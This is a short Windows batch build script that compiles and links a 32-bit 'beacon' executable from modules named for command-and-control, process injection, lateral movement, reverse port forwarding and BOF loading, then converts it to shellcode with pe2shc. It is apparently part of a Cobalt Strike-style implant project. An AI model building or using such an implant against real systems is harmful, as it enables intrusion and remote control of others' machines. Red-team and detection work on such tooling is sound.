set input=%1%
@echo off
mkdir release32
clang++ --target=i686-pc-windows-msvc -c c2profile.cpp -o ./release32/c2profile.o
clang++ --target=i686-pc-windows-msvc -L ./ beaconMain.cpp ./release32/c2profile.o ./release32/Utils.o ./release32/rotation.o ./release32/Global.o ./release32/encrypt_decrypt.o ./release32/common.o ./release32/comm.o ./release32/ChildBeacon.o ./release32/BeaconX64.o ./release32/BeaconTask.o ./release32/BeaconSleep.o ./release32/Beaconrportfwd.o ./release32/BeaconLateralMovement.o ./release32/BeaconJob.o ./release32/BeaconInject.o ./release32/BeaconFileManage.o ./release32/BeaconBof.o -o ./release32/o.exe
pe2shc.exe ./release32/o.exe ./release32/beacon.exe
echo "success" > %input%
exit